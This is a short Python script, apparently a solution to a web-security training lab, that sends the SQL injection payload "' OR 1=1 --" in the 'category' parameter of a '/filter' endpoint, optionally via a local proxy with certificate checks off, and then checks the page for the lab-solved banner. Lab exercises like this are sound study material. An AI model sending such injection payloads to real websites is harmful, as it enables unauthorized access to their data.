from bs4 import BeautifulSoup
from urllib.parse import urljoin

import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("url")
    parser.add_argument("-x", "--use-proxy", type=bool, default=False)
    return parser.parse_args()


def main():
    args = get_args()
    url = urljoin(args.url, "/filter")
    proxies = (
        None
        if not args.use_proxy
        else {"http": "http://localhost:8080", "https": "http://localhost:8080"}
    )

    requests.get(
        url,
        params={"category": "' OR 1=1 --"},
        proxies=proxies,
        verify=False,
    )

    print("SQL injection attack performed. Visiting URL to confirm lab is solved...")

    resp = requests.get(url)
    soup = BeautifulSoup(resp.text, "html.parser")
    print(soup.select_one("#notification-labsolved h4").text)


if __name__ == "__main__":
    main()
